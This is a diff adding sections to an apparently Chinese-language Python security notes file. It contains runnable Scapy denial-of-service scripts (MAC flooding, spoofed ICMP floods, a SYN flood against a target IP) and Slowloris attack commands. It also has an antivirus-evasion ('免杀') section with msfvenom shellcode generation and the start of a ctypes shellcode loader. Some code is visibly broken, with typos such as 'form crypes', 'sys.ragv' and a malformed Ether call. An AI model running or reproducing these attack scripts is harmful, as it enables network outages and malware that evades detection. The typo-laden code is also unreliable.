@@ -3834,3 +3834,155 @@ if __name__ == '__main__':
 ```
 
 </details>
+
+<details>
+<summary>数据链路层DoS_随机生成MAC地址</summary>
+
+```
+from scapy.all import *
+import time
+while(1):
+packet=Ether(src=RandMAC().dst=RandMAC())
+time.sleep(1)
+print(packet.summary())
+```
+
+</details>
+
+<details>
+<summary>数据链路层DoS_ICMP数据包</summary>
+
+```
+from scapy.all import *
+import optparse
+
+def attack(interface):
+    pkt=Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
+    sendp(pkt,iface=interface)
+
+# send(): Layer 3 发送IP封包，由操作系统负责封装Ethernet Header
+# sendp(): Layer 2 直接发送完整Ethernet Frame,需要自己提供Ethernet Header
+# 由于MAC和IP都是随机的：
+# 大多数情况下交换器会直接丢弃封包，或目的主机不会回应
+# 若使用随机来源地址，也无法收到对应的ICMP Echo Reply
+
+def main():
+    parser=optparse.OptionParser("%prog "+" -i interface")
+    parser.add_option('-i',dest='interface', default='eth0',type='string',help='Interface')
+    (options,args)=parser.parse_args()
+    interface=options.interface
+    try:
+        while True:
+            attack(interface)
+    except KeyboardInterrupt:
+        print('-------------')
+        print('Finished!')
+if __name__ == '__main__':
+    main()
+```
+
+</details>
+
+<details>
+<summary>网络层DoS</summary>
+
+```
+# -*- coding:utf-8 -*-
+import sys
+from scapy.all import *
+
+def start(argv):
+    if len(sys.argv) < 2:  #python program.py 192.168.1.100
+        print(sys.argv[0] + "   <target_ip>")
+        sys.exit(0)
+    while(1):
+        pdst = sys.argv[1]
+        send(IP(src=RandIP(),dst=pdst)/ICMP())
+
+if __name__ == '__main__':
+    # 定义异常
+    try:
+        start(sys.argv[1:])
+    except KeyboardInterrupt:
+        print("interrupted by user, killing all threads...")
+```
+
+</details>
+
+<details>
+<summary>传输层DoS</summary>
+
+```
+#-*- coding:utf-8 -*-
+import sys
+from scapy.all import *
+
+def start(argv):
+    if len(sys.argv) < 2:
+        print(sys.ragv[0] +" <target_ip>")
+        sys.exit(0)
+    while(1):
+        pdst = sys.argv[1]
+        send(IP(src=RandIP(),dst=pdst)/TCP(dport=443,flags="S"))
+
+if __name__ == '__main__':
+    # 定义异常
+    try:
+        start(sys.argv[1:])
+    except KeyboardInterrupt:
+        print("interrupted by uesr, killing all threads...")
+```
+
+</details>
+
+<details>
+<summary>应用层DoS</summary>
+
+```
+[1]CC攻击
+[2]Slowloris攻击: HTTP协议，HTTP Request以"r\n\r\n“结尾表四客户端发送结束 ；Apache官方否认Slowloris的攻击方式是一个漏洞
+[3]Server Limit DoS
+
+>>> pip3 install slowloris #需切换到当前python环境的Script目录
+>>> slowloris ip           #默认情况下Slowloris有150个连接，效果可能不明显；可以使用-s参数指定连接数
+>>> slowloris 10.0.2.16 -s 1500
+Wrieshark ： HTTP发送结尾的字符为 4026\r\n ;如 'Hypertext Transfer Protocol  X-a: 4026\r\n'
+```
+
+</details>
+
+----------------------------------------------------------------------------
+#### Python 免杀技术 Anti Anti-Virus,又称反杀毒软件技术，简称‘免杀’如 汇编、逆向、系统漏洞等，主要思路是通过 修改木马及病毒的特征，包括代码特征、行为特征，从而躲避杀毒软件的查杀
+
+<details>
+<summary>生成shellcode</summary>
+
+```
+----------------------------------------------------------------------------
+[1]一个为公开的漏洞库exploit-db
+[2]一个为公开的Shell-strom库
+[3]Metasploit进行shellcode生成 直接输入 msfvenom
+
+# msfvenom
+# msfvenom --list payload
+# msfvenom -p windows/x64/exec CMD='calc.exe' -f py #选择windows/x64/exec模块，设置接收值为calc.exe，选择-f选项指定生成脚本为Python脚本的shellcode
+----------------------------------------------------------------------------
+#shellcode常用机器语言编写，可在寄存器eip溢出后，载入一段可让CPU执行的shellcode机器码，让计算机可以执行任意指令
+
+1.内存加载shellcode
+# msfvenom -p windows/x64/exec CMD='calc.exe' -f py
+
+#导入模块，并给程序分配内存后可进行读写操作
+from ctypes import *
+form crypes.wintypes import *
+import sys
+
+PAGE_EXECUTE_READWRITE = 0x000000040 #区域可执行代码，可读可写
+MWM_COMMIT = 0x3000 # 分配内存
+PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) #给予进程所有权限
+
+#调用windows api,调用一些底层函数，或者少见的API函数，就可以绕过杀毒软件的API检测
+#windows api
+```
+
+</details>
